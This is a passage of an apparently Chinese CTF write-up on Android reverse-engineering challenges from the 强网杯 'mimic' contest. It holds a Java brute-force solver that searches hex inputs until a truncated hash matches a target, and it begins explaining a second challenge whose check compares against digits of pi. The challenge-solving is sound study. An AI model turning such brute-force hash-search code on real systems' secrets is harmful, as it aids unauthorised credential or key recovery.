class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">import</span> java.security.InvalidKeyException;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Mac;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="comment">// 爆破第二个clip</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">m1micXctfHaha</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[][] SpecBytesMat =&#123;  hex2Bytes(<span class="string">&quot;2bf07832853b16d0339f1a43900c3481&quot;</span>),</span><br><span class="line">                                            hex2Bytes(<span class="string">&quot;35aaae7322e0e37f3ba0fbcb25981aa7&quot;</span>),</span><br><span class="line">                                            hex2Bytes(<span class="string">&quot;ccb8cc2b84ac701819b738255f518c2d&quot;</span>),</span><br><span class="line">                                            hex2Bytes(<span class="string">&quot;663b77d67c17a0a8d4f12acf35aba2b4&quot;</span>),</span><br><span class="line">                                            hex2Bytes(<span class="string">&quot;9f3a3227ce8bd38475cf317347874d11&quot;</span>),</span><br><span class="line">                                            hex2Bytes(<span class="string">&quot;c08ba12183ecabc899c3957675e28cd9&quot;</span>),</span><br><span class="line">                                            hex2Bytes(<span class="string">&quot;6d330eef823b5c741e37f978488890b1&quot;</span>),</span><br><span class="line">                                            hex2Bytes(<span class="string">&quot;9e99c54e9dcea758cecf0d4cc18a0c22&quot;</span>)&#125;;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] rndKeys = &#123;<span class="number">4</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">8</span>&#125;;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String[] clips_i_hash_mat=&#123; <span class="string">&quot;fc7466e55fbf37b1&quot;</span>, <span class="string">&quot;78b0be39e63b6837&quot;</span>, <span class="string">&quot;c2f9c805d0442203&quot;</span>, <span class="string">&quot;c11a61bb60d79dab&quot;</span>, <span class="string">&quot;869e650ee55bd9f6&quot;</span>, <span class="string">&quot;f2dda5fc021fe2bf&quot;</span>, <span class="string">&quot;305044db48fe6174&quot;</span>, <span class="string">&quot;d6659b5e2d1059f8&quot;</span>&#125;;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String charset3 = <span class="string">&quot;01234567&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String charset4 = <span class="string">&quot;0123456789abcdef&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> c0=<span class="number">0</span>;c0&lt;<span class="number">8</span>;c0++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> c1=<span class="number">0</span>;c1&lt;<span class="number">16</span>;c1++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> c2=<span class="number">0</span>;c2&lt;<span class="number">8</span>;c2++)&#123;</span><br><span class="line"></span><br><span class="line">                    String clip_now = <span class="string">&quot;&quot;</span> + charset3.charAt(c0)+charset4.charAt(c1)+charset3.charAt(c2);</span><br><span class="line">                    System.out.println(clip_now);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> c3=<span class="number">0</span>;c3&lt;<span class="number">16</span>;c3++)&#123;</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> c4=<span class="number">0</span>;c4&lt;<span class="number">8</span>;c4++)&#123;</span><br><span class="line">                            <span class="keyword">for</span>(<span class="keyword">int</span> c5=<span class="number">0</span>;c5&lt;<span class="number">16</span>;c5++)&#123;</span><br><span class="line">                                <span class="keyword">for</span>(<span class="keyword">int</span> c6=<span class="number">0</span>;c6&lt;<span class="number">8</span>;c6++)&#123;</span><br><span class="line">                                    <span class="keyword">for</span>(<span class="keyword">int</span> c7=<span class="number">0</span>;c7&lt;<span class="number">16</span>;c7++)&#123;</span><br><span class="line">                                        String clip = <span class="string">&quot;&quot;</span>+charset3.charAt(c0)+charset4.charAt(c1)+charset3.charAt(c2)+charset4.charAt(c3)+charset3.charAt(c4)+charset4.charAt(c5)+charset3.charAt(c6)+charset4.charAt(c7);</span><br><span class="line">                                        <span class="comment">// String clip = &quot;00010567&quot;;</span></span><br><span class="line">                                        <span class="keyword">byte</span>[] clip_bytes = hex2Bytes(clip);</span><br><span class="line">                                        String clip_i_hash = hash_int_string_add0_0_16(<span class="number">10</span>, clip_bytes);</span><br><span class="line"></span><br><span class="line">                                        <span class="comment">// if(clip_i_hash==null)&#123;</span></span><br><span class="line">                                        <span class="comment">//     continue;</span></span><br><span class="line">                                        <span class="comment">// &#125;</span></span><br><span class="line">                                        </span><br><span class="line">                                        <span class="comment">// System.out.println(&quot;clip: &quot;, clip);</span></span><br><span class="line">                                        <span class="comment">// System.out.println(&#x27;clip_i_hash: &#x27;, clip_i_hash);</span></span><br><span class="line">                                        <span class="comment">// return ;</span></span><br><span class="line"></span><br><span class="line">                                        <span class="keyword">if</span>(clip_i_hash.equals(<span class="string">&quot;78b0be39e63b6837&quot;</span>))&#123;</span><br><span class="line">                                            System.out.println(<span class="string">&quot;+++++++\nclip1: &quot;</span> + clip + <span class="string">&quot;rndKeyi=&quot;</span> + <span class="number">10</span>);</span><br><span class="line">                                            System.out.println(<span class="string">&quot;clip_i_hash: &quot;</span> + clip_i_hash);</span><br><span class="line">                                            <span class="keyword">return</span> ;</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    </span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;   </span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">hash_int_string_add0_0_16</span><span class="params">(<span class="keyword">int</span> argRndKey, <span class="keyword">byte</span>[] argBytes)</span> </span>&#123;</span><br><span class="line">        String v0_1;</span><br><span class="line">        <span class="keyword">byte</span>[] argBytes1 = argBytes;</span><br><span class="line">        <span class="keyword">if</span>((argRndKey &gt;&gt;&gt; <span class="number">3</span> &amp; <span class="number">1</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">switch</span>(argRndKey &amp; <span class="number">7</span>) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>: &#123;</span><br><span class="line">                    v0_1 = SHA512_int_String_add0(argBytes1, SpecBytesMat[<span class="number">0</span>]);</span><br><span class="line">                    <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>: &#123;</span><br><span class="line">                    v0_1 = SHA512_int_String_add0(argBytes1, SpecBytesMat[<span class="number">1</span>]);</span><br><span class="line">                    <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>: &#123;</span><br><span class="line">                    v0_1 = SHA512_int_String_add0(argBytes1, SpecBytesMat[<span class="number">2</span>]);</span><br><span class="line">                    <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>: &#123;</span><br><span class="line">                    v0_1 = SHA512_int_String_add0(argBytes1, SpecBytesMat[<span class="number">3</span>]);</span><br><span class="line">                    <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">4</span>: &#123;</span><br><span class="line">                    v0_1 = SHA512_int_String_add0(argBytes1, SpecBytesMat[<span class="number">4</span>]);</span><br><span class="line">                    <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">5</span>: &#123;</span><br><span class="line">                    v0_1 = SHA512_int_String_add0(argBytes1, SpecBytesMat[<span class="number">5</span>]);</span><br><span class="line">                    <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">6</span>: &#123;</span><br><span class="line">                    v0_1 = SHA512_int_String_add0(argBytes1, SpecBytesMat[<span class="number">6</span>]);</span><br><span class="line">                    <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">7</span>: &#123;</span><br><span class="line">                    v0_1 = SHA512_int_String_add0(argBytes1, SpecBytesMat[<span class="number">7</span>]);</span><br><span class="line">                    <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">default</span>: &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> v1 = argRndKey &amp; <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">if</span>(v1 == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(argBytes1.length != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    MessageDigest v1_11 = MessageDigest.getInstance(<span class="string">&quot;MD2&quot;</span>);</span><br><span class="line">                    v1_11.update(argBytes1);</span><br><span class="line">                    <span class="keyword">byte</span>[] v0_13 = v1_11.digest();</span><br><span class="line">                    <span class="keyword">char</span>[] v1_12 = <span class="keyword">new</span> <span class="keyword">char</span>[]&#123;<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>&#125;;</span><br><span class="line">                    <span class="keyword">char</span>[] v2_1 = <span class="keyword">new</span> <span class="keyword">char</span>[v0_13.length * <span class="number">2</span>];</span><br><span class="line">                    <span class="keyword">int</span> v3_5 = v0_13.length;</span><br><span class="line">                    <span class="keyword">int</span> v4_5 = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">int</span> v5_1 = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">while</span>(v4_5 &lt; v3_5) &#123;</span><br><span class="line">                        <span class="keyword">int</span> v6_1 = v0_13[v4_5];</span><br><span class="line">                        <span class="keyword">int</span> v8_1 = v5_1 + <span class="number">1</span>;</span><br><span class="line">                        v2_1[v5_1] = v1_12[v6_1 &gt;&gt;&gt; <span class="number">4</span> &amp; <span class="number">15</span>];</span><br><span class="line">                        v5_1 = v8_1 + <span class="number">1</span>;</span><br><span class="line">                        v2_1[v8_1] = v1_12[v6_1 &amp; <span class="number">15</span>];</span><br><span class="line">                        ++v4_5;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    v0_1 = <span class="keyword">new</span> String(v2_1);</span><br><span class="line">                    <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span>(NoSuchAlgorithmException v0_12) &#123;</span><br><span class="line">                    v0_12.printStackTrace();</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(v1 == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(argBytes1.length != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    MessageDigest v1_9 = MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">                    v1_9.update(argBytes1);</span><br><span class="line">                    <span class="keyword">byte</span>[] v0_11 = v1_9.digest();</span><br><span class="line">                    <span class="keyword">char</span>[] v1_10 = <span class="keyword">new</span> <span class="keyword">char</span>[]&#123;<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>&#125;;</span><br><span class="line">                    <span class="keyword">char</span>[] v2 = <span class="keyword">new</span> <span class="keyword">char</span>[v0_11.length * <span class="number">2</span>];</span><br><span class="line">                    <span class="keyword">int</span> v3_4 = v0_11.length;</span><br><span class="line">                    <span class="keyword">int</span> v4_4 = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">int</span> v5 = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">while</span>(v4_4 &lt; v3_4) &#123;</span><br><span class="line">                        <span class="keyword">int</span> v6 = v0_11[v4_4];</span><br><span class="line">                        <span class="keyword">int</span> v8 = v5 + <span class="number">1</span>;</span><br><span class="line">                        v2[v5] = v1_10[v6 &gt;&gt;&gt; <span class="number">4</span> &amp; <span class="number">15</span>];</span><br><span class="line">                        v5 = v8 + <span class="number">1</span>;</span><br><span class="line">                        v2[v8] = v1_10[v6 &amp; <span class="number">15</span>];</span><br><span class="line">                        ++v4_4;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    v0_1 = <span class="keyword">new</span> String(v2);</span><br><span class="line">                    <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span>(NoSuchAlgorithmException v0_10) &#123;</span><br><span class="line">                    v0_10.printStackTrace();</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(v1 == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(argBytes1.length != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    MessageDigest v1_7 = MessageDigest.getInstance(<span class="string">&quot;SHA-1&quot;</span>);</span><br><span class="line">                    v1_7.update(argBytes1);</span><br><span class="line">                    <span class="keyword">byte</span>[] v0_9 = v1_7.digest();</span><br><span class="line">                    StringBuilder v1_8 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                    <span class="keyword">int</span> v3_3 = v0_9.length;</span><br><span class="line">                    <span class="keyword">int</span> v4_3;</span><br><span class="line">                    <span class="keyword">for</span>(v4_3 = <span class="number">0</span>; v4_3 &lt; v3_3; ++v4_3) &#123;</span><br><span class="line">                        v1_8.append(String.format(<span class="string">&quot;%02x&quot;</span>, ((<span class="keyword">byte</span>)v0_9[v4_3])));</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    v0_1 = v1_8.toString();</span><br><span class="line">                    <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span>(NoSuchAlgorithmException v0_8) &#123;</span><br><span class="line">                    v0_8.printStackTrace();</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(v1 == <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(argBytes1.length != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    MessageDigest v1_5 = MessageDigest.getInstance(<span class="string">&quot;SHA-224&quot;</span>);</span><br><span class="line">                    v1_5.update(argBytes1);</span><br><span class="line">                    <span class="keyword">byte</span>[] v0_7 = v1_5.digest();</span><br><span class="line">                    StringBuilder v1_6 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                    <span class="keyword">int</span> v3_2 = v0_7.length;</span><br><span class="line">                    <span class="keyword">int</span> v4_2;</span><br><span class="line">                    <span class="keyword">for</span>(v4_2 = <span class="number">0</span>; v4_2 &lt; v3_2; ++v4_2) &#123;</span><br><span class="line">                        v1_6.append(String.format(<span class="string">&quot;%02x&quot;</span>, ((<span class="keyword">byte</span>)v0_7[v4_2])));</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    v0_1 = v1_6.toString();</span><br><span class="line">                    <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span>(NoSuchAlgorithmException v0_6) &#123;</span><br><span class="line">                    v0_6.printStackTrace();</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(v1 == <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(argBytes1.length != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    MessageDigest v1_3 = MessageDigest.getInstance(<span class="string">&quot;SHA-256&quot;</span>);</span><br><span class="line">                    v1_3.update(argBytes1);</span><br><span class="line">                    <span class="keyword">byte</span>[] v0_5 = v1_3.digest();</span><br><span class="line">                    StringBuilder v1_4 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                    <span class="keyword">int</span> v3_1 = v0_5.length;</span><br><span class="line">                    <span class="keyword">int</span> v4_1;</span><br><span class="line">                    <span class="keyword">for</span>(v4_1 = <span class="number">0</span>; v4_1 &lt; v3_1; ++v4_1) &#123;</span><br><span class="line">                        v1_4.append(String.format(<span class="string">&quot;%02x&quot;</span>, ((<span class="keyword">byte</span>)v0_5[v4_1])));</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    v0_1 = v1_4.toString();</span><br><span class="line">                    <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span>(NoSuchAlgorithmException v0_4) &#123;</span><br><span class="line">                    v0_4.printStackTrace();</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(v1 == <span class="number">5</span> &amp;&amp; argBytes1.length != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                MessageDigest v1_1 = MessageDigest.getInstance(<span class="string">&quot;SHA-384&quot;</span>);</span><br><span class="line">                v1_1.update(argBytes1);</span><br><span class="line">                <span class="keyword">byte</span>[] v0_3 = v1_1.digest();</span><br><span class="line">                StringBuilder v1_2 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                <span class="keyword">int</span> v3 = v0_3.length;</span><br><span class="line">                <span class="keyword">int</span> v4;</span><br><span class="line">                <span class="keyword">for</span>(v4 = <span class="number">0</span>; v4 &lt; v3; ++v4) &#123;</span><br><span class="line">                    v1_2.append(String.format(<span class="string">&quot;%02x&quot;</span>, ((<span class="keyword">byte</span>)v0_3[v4])));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                v0_1 = v1_2.toString();</span><br><span class="line">                <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span>(NoSuchAlgorithmException v0_2) &#123;</span><br><span class="line">                v0_2.printStackTrace();</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">SHA512_int_String_add0</span><span class="params">(<span class="keyword">byte</span>[] arg2, <span class="keyword">byte</span>[] arg3)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            SecretKeySpec v1 = <span class="keyword">new</span> SecretKeySpec(arg3, <span class="string">&quot;HmacSha512&quot;</span>);</span><br><span class="line">            Mac v3 = Mac.getInstance(<span class="string">&quot;HmacSha512&quot;</span>);</span><br><span class="line">            v3.init(v1);</span><br><span class="line">            v3.update(arg2);</span><br><span class="line">            String v2_1;  <span class="comment">// hash -&gt; BigInteger -&gt; String</span></span><br><span class="line">            <span class="keyword">for</span>(v2_1 = <span class="keyword">new</span> BigInteger(<span class="number">1</span>, v3.doFinal()).toString(<span class="number">16</span>); v2_1.length() &lt; <span class="number">32</span>; v2_1 = <span class="string">&quot;0&quot;</span> + v2_1) &#123;  <span class="comment">// hash -&gt; BigInteger -&gt; String</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> v2_1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(NoSuchAlgorithmException | InvalidKeyException v2) &#123;</span><br><span class="line">            v2.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] hex2Bytes(String arg6) &#123;</span><br><span class="line">        <span class="keyword">int</span> lens = arg6.length();</span><br><span class="line">        <span class="keyword">byte</span>[] v1 = <span class="keyword">new</span> <span class="keyword">byte</span>[lens / <span class="number">2</span>];</span><br><span class="line">        <span class="keyword">int</span> ind = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(ind &lt; lens) &#123;</span><br><span class="line">            <span class="keyword">int</span> v3 = Character.digit(arg6.charAt(ind), <span class="number">16</span>) &lt;&lt; <span class="number">4</span>;</span><br><span class="line">            <span class="keyword">int</span> v4 = Character.digit(arg6.charAt(ind + <span class="number">1</span>), <span class="number">16</span>);</span><br><span class="line">            <span class="keyword">if</span>(v3 &gt;= <span class="number">0</span> &amp;&amp; v4 &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                v1[ind / <span class="number">2</span>] = (<span class="keyword">byte</span>)(v3 + v4);</span><br><span class="line">                ind += <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> v1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/Snipaste_2021-00-52-201.png" alt="Snipaste_2021-00-52-201" style="zoom:33%;" /></li></ol><h1 id="mimic-xctf-studydesk"><a href="#mimic-xctf-studydesk" class="headerlink" title="mimic-xctf-studydesk"></a>mimic-xctf-studydesk</h1><blockquote><p>强网杯 “拟态”比赛 mobile2</p></blockquote><p>当时做完了mobile1比较晚了，就没怎么细看这个题，没想到挺简单的。</p><p>flag要求长度为32，也就是32个byte，然后进行了一系列的处理。<br>引入了一个静态byte数组staticBytes，长度为288。对于其中的每个byte，去flag中查找下标，即<code>ind=flag.index(staticBytes[i])</code>。<br>因为flag本身长度为32，所以0&lt;ind&lt;32，所以保存为5bit，总共得到1440bit。<br>然后分割得到180个byte，记作<code>byteArray</code>，并将其与目标数组<code>aimBytes</code>比较。</p><p><code>aimBytes</code>的生成比较烧脑，但还好它是输入无关的。<br>把代码copy出来跑一遍，可以发现生成的是圆周率3.1415926……<br>把pi值转换成string，去掉小数点，每相邻两个数字处理为一个byte，得到<code>aimBytes</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">BigDecimal v2_1 = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">BigDecimal v3_1 = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">BigDecimal v4_2 = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;6&quot;</span>);</span><br><span class="line">MathContext MathCtx1 = <span class="keyword">new</span> MathContext(<span class="number">360</span>, RoundingMode.HALF_UP);  <span class="comment">// (digits, roundingMode)</span></span><br><span class="line">MathContext MathCtx2 = <span class="keyword">new</span> MathContext(<span 